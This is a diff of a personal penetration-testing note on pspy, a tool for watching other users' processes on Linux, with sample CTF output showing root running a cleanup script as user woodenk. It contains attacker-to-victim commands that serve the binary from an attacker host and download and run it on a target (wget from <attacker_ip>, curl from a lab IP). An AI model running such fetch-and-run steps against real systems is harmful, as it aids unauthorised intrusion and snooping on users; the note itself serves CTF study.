@@ -1,42 +1,53 @@
 # 💢 pspy
 Tags: #💢
 Related to: [[Vulnerability Analysis]]
-See also: 
-Previous: [[ ]]
+See also:
+Previous:
 
----
 ## Description
+
 pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.
 
 The tool gathers the info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes.
 
 ## Usage Examples
 
-Download statically compiled binary locally:
+### Spy on processes
 
-	wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+Attacker:
 
-Check that the file is an executable:
+	python3 -m http.server 80
 
-	file pspy64s
+Victim:
 
-Start Simple HTTP Server:
+	wget <attacker_ip>/pspy64
+	chmod +x pspy64
+	./pspy64
 
-	python -m SimpleHTTPServer 80		// Python
-	python3	-m http.server 80			// Python 3
+root runs `cleanup.sh` as woodenk:
 
-Download to target system:
+```text
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░
+CMD: UID=113  PID=914    | /usr/sbin/mysqld
+CMD: UID=1000 PID=882    | java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
 
-	curl 10.10.17.201/pspy64s -o pspy64s
-	wget 10.10.17.201/pspy64s -o pspy64s
-
-Spy on processes:
-
+CMD: UID=0    PID=22536  | /bin/sh -c sudo -u woodenk /opt/cleanup.sh
+CMD: UID=1000 PID=22543  | /bin/bash /opt/cleanup.sh 
+CMD: UID=1000 PID=22544  | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 
+CMD: UID=1000 PID=22563  | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ;
+CMD: UID=1000 PID=22555  | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
+CMD: UID=1000 PID=22565  | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
 ```
-./pspy64s -fc	// -f 	print file system events
-				// -c	color
-```
 
----
-## References
-- https://github.com/DominicBreuker/pspy/releases
+# References
+
+https://github.com/DominicBreuker/pspy/releases
